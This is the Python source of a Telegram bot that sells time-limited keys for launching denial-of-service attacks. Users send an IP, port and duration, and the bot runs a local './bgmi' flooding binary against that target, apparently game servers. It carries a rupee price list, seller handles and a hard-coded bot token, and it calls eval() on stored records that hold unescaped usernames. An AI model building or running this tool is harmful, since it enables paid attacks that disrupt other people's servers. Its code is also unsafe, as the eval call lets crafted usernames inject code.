import os
import telebot
import asyncio
import logging
import random
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread

# सेटअप
loop = asyncio.get_event_loop()
TOKEN = '7834211332:AAEWehgWzZJY1Z2DgMiEi7Ixv97M6Obwk9k'
bot = telebot.TeleBot(TOKEN)
OWNER_IDS = [7468235894, 6404882101, 6902791681]

# फाइल नाम
KEYS_FILE = 'keys.txt'
USED_KEYS_FILE = 'used_keys.txt'
TRIAL_USERS_FILE = 'trial_users.txt'
LOG_FILE = 'bot_logs.txt'
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
running_processes = []

owner_username = '@DarkNet_AJ'

VALID_DURATIONS = {
    "5 hour": (50, 5/24),
    "1 day": (149, 1),
    "2 days": (199, 2),
    "3 days": (249, 3),
    "4 days": (299, 4),
    "5 days": (349, 5),
    "6 days": (399, 6),
    "7 days": (449, 7),
    "30 days": (1499, 30),
    "full session": (2499, 90)
}

# फाइल्स इनिशियलाइज़ेशन
def initialize_files():
    files = [KEYS_FILE, USED_KEYS_FILE, TRIAL_USERS_FILE, LOG_FILE]
    for file in files:
        if not os.path.exists(file):
            with open(file, 'w') as f:
                pass

initialize_files()

# लॉगिंग सेटअप
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)

def is_valid_ip(ip):
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(part) <= 255 for part in parts)
    except ValueError:
        return False

async def run_attack_command_on_codespace(ip, port, duration, chat_id):
    command = f"./bgmi {ip} {port} {duration} 1300"
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        running_processes.append(process)
        
        stdout, stderr = await process.communicate()
        
        if process.returncode == 0:
            bot.send_message(
                chat_id,
                f"✅ *Attack Completed Successfully!*\n\n"
                f"🎯 Target: `{ip}:{port}`\n"
                f"⏱ Duration: `{duration}` seconds\n\n"
                f"👑 Owner: {owner_username}",
                parse_mode='Markdown'
            )
        else:
            error_msg = stderr.decode().strip() or "Unknown error"
            bot.send_message(
                chat_id,
                f"❌ *Attack Failed!*\n\n"
                f"Error: `{error_msg}`\n\n"
                f"Contact {owner_username}",
                parse_mode='Markdown'
            )
            logging.error(f"Attack failed: {error_msg}")
            
    except Exception as e:
        logging.error(f"Attack error: {e}", exc_info=True)
        bot.send_message(
            chat_id,
            f"⚠️ *Critical Error!*\n\n`{str(e)}`\n\nContact {owner_username}",
            parse_mode='Markdown'
        )
    finally:
        if process in running_processes:
            running_processes.remove(process)

def is_user_approved(user_id):
    if user_id in OWNER_IDS:
        return True
    
    if not os.path.exists(USED_KEYS_FILE):
        return False
    
    with open(USED_KEYS_FILE, 'r') as file:
        for line in file:
            try:
                data = eval(line.strip())
                if data['user_id'] == user_id and datetime.now() <= datetime.fromisoformat(data['valid_until']):
                    return True
            except:
                continue
    return False

def send_price_list(chat_id):
    msg = (
        "🔥 *NEW POWER FULL BOT* 😈😈\n\n"
        "*FEATURES DURETION TIMING 1000+ SECOND AUR 1 MATCH IN MULTIPLE ATTACK* 🚀\n\n"
        "*PRICE LIST* 👇\n\n"
        "⚡️ 5 hour = 50\n"
        "⚡ 1 day = 149\n"
        "⚡ 2 days = 199\n"
        "⚡ 3 days = 249\n"
        "⚡ 4 days = 299\n"
        "⚡ 5 days = 349\n"
        "⚡ 6 days = 399\n"
        "⚡ 7 days = 449\n"
        "⚡ 30 days = 1499\n"
        "⚡ FULL SESSION = 2499\n\n"
        "*BUY NOW* 👉 @Darknetdon1\n"
        "*OWNER* 👉 @DarkNet_AJ"
    )
    bot.send_message(chat_id, msg, parse_mode='Markdown')

@bot.message_handler(commands=['key'])
def handle_key_generation(message):
    user_id = message.from_user.id
    if user_id not in OWNER_IDS:
        bot.send_message(message.chat.id, "*Only owner can generate keys.*", parse_mode='Markdown')
        return

    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        valid_keys = ', '.join(VALID_DURATIONS.keys())
        bot.send_message(message.chat.id, f"*Use:* /key 2 days\n*Options:* {valid_keys}", parse_mode='Markdown')
        return

    duration = args[1].lower()
    if duration not in VALID_DURATIONS:
        valid_keys = ', '.join(VALID_DURATIONS.keys())
        bot.send_message(message.chat.id, f"*Invalid duration.* Use one of: {valid_keys}", parse_mode='Markdown')
        return

    price, days = VALID_DURATIONS[duration]
    key = f"{duration.replace(' ', '')}-" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))

    with open(KEYS_FILE, 'a') as f:
        f.write(f"{key}\n")

    bot.send_message(message.chat.id, f"*Key generated for {duration} (₹{price}):*\n`{key}`", parse_mode='Markdown')
    logging.info(f"New key generated by {user_id}: {key}")

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    bot.send_message(message.chat.id, "*Send your key to activate access:*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    key = message.text.strip()
    user_id = message.from_user.id

    if not os.path.exists(KEYS_FILE):
        bot.send_message(message.chat.id, "*No keys available.*", parse_mode='Markdown')
        return

    with open(KEYS_FILE, 'r') as file:
        keys = [line.strip() for line in file]

    if key not in keys:
        bot.send_message(message.chat.id, "*Invalid key.*", parse_mode='Markdown')
        return

    with open(KEYS_FILE, 'w') as file:
        for k in keys:
            if k != key:
                file.write(f"{k}\n")

    try:
        duration = key.split('-')[0]
        for valid_key in VALID_DURATIONS:
            if duration in valid_key.replace(" ", ""):
                price, days = VALID_DURATIONS[valid_key]
                break
        else:
            raise ValueError("Invalid duration")

        valid_until = (datetime.now() + timedelta(days=days)).isoformat()

        with open(USED_KEYS_FILE, 'a') as f:
            f.write(f"{{'user_id': {user_id}, 'valid_until': '{valid_until}', 'key': '{key}', 'username': '{message.from_user.username}'}}\n")

        bot.send_message(message.chat.id, f"*Access granted for {valid_key}!*", parse_mode='Markdown')
        logging.info(f"Key redeemed by {user_id}: {key}")
    except Exception as e:
        logging.error(f"Redeem error: {e}")
        bot.send_message(message.chat.id, "*Error processing key.*", parse_mode='Markdown')

@bot.message_handler(commands=['chek'])
def check_keys(message):
    if message.from_user.id not in OWNER_IDS:
        bot.send_message(message.chat.id, "⚠️ *Only owner can use this command.*", parse_mode='Markdown')
        return

    active_keys = []
    if os.path.exists(USED_KEYS_FILE):
        with open(USED_KEYS_FILE, 'r') as f:
            for line in f:
                try:
                    data = eval(line.strip())
                    if datetime.now() <= datetime.fromisoformat(data['valid_until']):
                        active_keys.append(
                            f"🔑 *Key:* `{data['key']}`\n"
                            f"👤 *User:* @{data.get('username', 'N/A')}\n"
                            f"⏳ *Valid Until:* {data['valid_until']}\n"
                        )
                except Exception as e:
                    logging.error(f"Error reading key: {e}")

    msg = f"🔐 *Active Keys: {len(active_keys)}*\n\n" + "\n".join(active_keys) if active_keys else "❌ *No active keys found.*"
    bot.send_message(message.chat.id, msg, parse_mode='Markdown')

@bot.message_handler(commands=['trial'])
def trial(message):
    user_id = message.from_user.id
    if user_id in OWNER_IDS:
        bot.send_message(message.chat.id, "*You already have access.*", parse_mode='Markdown')
        return

    if os.path.exists(TRIAL_USERS_FILE):
        with open(TRIAL_USERS_FILE, 'r') as f:
            if str(user_id) in f.read():
                bot.send_message(message.chat.id, "*You have already used your free trial.*", parse_mode='Markdown')
                return

    expiry = (datetime.now() + timedelta(minutes=10)).isoformat()
    with open(USED_KEYS_FILE, 'a') as f:
        f.write(f"{{'user_id': {user_id}, 'valid_until': '{expiry}', 'key': 'trial', 'username': '{message.from_user.username}'}}\n")
    with open(TRIAL_USERS_FILE, 'a') as f:
        f.write(f"{user_id}\n")

    bot.send_message(message.chat.id, "*10-minute trial activated!*", parse_mode='Markdown')
    logging.info(f"Trial activated for {user_id}")

@bot.message_handler(commands=['start'])
def start(message):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("🚀 Start Attack"),
               KeyboardButton("✅ My Account"))
    markup.add(KeyboardButton("🔐🔑 Buy Key"),
               KeyboardButton("🚩 Trial"))
    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda msg: msg.text in ["🔐🔑 Buy Key", "Buy Key", "buy key"])
def handle_buy_key(message):
    send_price_list(message.chat.id)

@bot.message_handler(func=lambda m: True)
def handle_menu(message):
    user_id = message.from_user.id
    text = message.text.lower()

    if "start attack" in text:
        if not is_user_approved(user_id):
            send_price_list(message.chat.id)
            return
        bot.send_message(message.chat.id, "*Send: IP PORT TIME*\n*Example:* `12.23.121.12 12345 120`", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack)

    elif "my account" in text:
        if not is_user_approved(user_id):
            send_price_list(message.chat.id)
            return
        expiry = "Unknown"
        with open(USED_KEYS_FILE, 'r') as file:
            for line in file:
                try:
                    data = eval(line.strip())
                    if data['user_id'] == user_id:
                        expiry = data['valid_until']
                        break
                except:
                    continue
        bot.send_message(message.chat.id, f"*User ID:* `{user_id}`\n*Valid Until:* `{expiry}`", parse_mode='Markdown')

    elif "trial" in text:
        trial(message)

    else:
        bot.send_message(message.chat.id, "❌ *Invalid option. Use buttons below 👇*", parse_mode='Markdown')

def process_attack(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "❌ *Invalid format!*\nUse: `IP PORT TIME`\nExample: `12.23.121.12 12345 120`", parse_mode='Markdown')
            return

        ip, port, time = args[0], args[1], args[2]
        
        # IP Validation
        if not is_valid_ip(ip):
            bot.send_message(message.chat.id, "❌ *Invalid IP!*\nMust be like: `123.45.67.89`", parse_mode='Markdown')
            return
            
        # Port Validation
        try:
            port = int(port)
            if port in blocked_ports:
                bot.send_message(message.chat.id, f"❌ *Port {port} is blocked!*", parse_mode='Markdown')
                return
            if not (1 <= port <= 65535):
                bot.send_message(message.chat.id, "❌ *Port must be between 1-65535*", parse_mode='Markdown')
                return
        except ValueError:
            bot.send_message(message.chat.id, "❌ *Port must be a number!*", parse_mode='Markdown')
            return
            
        # Time Validation
        try:
            time = int(time)
            if time <= 0:
                bot.send_message(message.chat.id, "❌ *Time must be positive!*", parse_mode='Markdown')
                return
            if time > 1200:
                bot.send_message(message.chat.id, "❌ *Max time is 1200 seconds (20 mins)*", parse_mode='Markdown')
                return
        except ValueError:
            bot.send_message(message.chat.id, "❌ *Time must be a number!*", parse_mode='Markdown')
            return

        # Check bgmi file
        if not os.path.exists('./bgmi'):
            bot.send_message(message.chat.id, "❌ *Attack tool not found!*\nContact Owner @DarkNet_AJ", parse_mode='Markdown')
            logging.error("bgmi file missing")
            return

        if not os.access('./bgmi', os.X_OK):
            bot.send_message(message.chat.id, "❌ *Permission denied!*\nRun: `chmod +x bgmi`", parse_mode='Markdown')
            logging.error("bgmi not executable")
            return

        # Run attack
        username = message.from_user.username or "Unknown"
        asyncio.run_coroutine_threadsafe(
            run_attack_command_on_codespace(ip, port, time, message.chat.id),
            loop
        )
        
        attack_msg = (
            f"🚀 *Attack Launched!* 💥\n\n"
            f"• *Target:* `{ip}:{port}`\n"
            f"• *Duration:* `{time}` seconds\n"
            f"• *User:* @{username}\n\n"
            f"_Wait for completion message..._\n\n"
            f"👑 Owner: @DarkNet_AJ"
        )
        bot.send_message(message.chat.id, attack_msg, parse_mode='Markdown')
        logging.info(f"Attack started: {ip}:{port} for {time}s by {username}")

    except Exception as e:
        error_msg = (
            f"❌ *Attack Failed!*\n\n"
            f"*Error:* `{str(e)}`\n\n"
            f"Please check:\n"
            f"1. Correct IP:Port\n"
            f"2. Valid duration\n"
            f"3. Server status\n\n"
            f"Contact @DarkNet_AJ if problem continues"
        )
        bot.send_message(message.chat.id, error_msg, parse_mode='Markdown')
        logging.error(f"Attack error: {e}", exc_info=True)

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

if __name__ == '__main__':
    logging.info("Bot starting...")
    Thread(target=start_asyncio_thread).start()
    bot.polling(none_stop=True)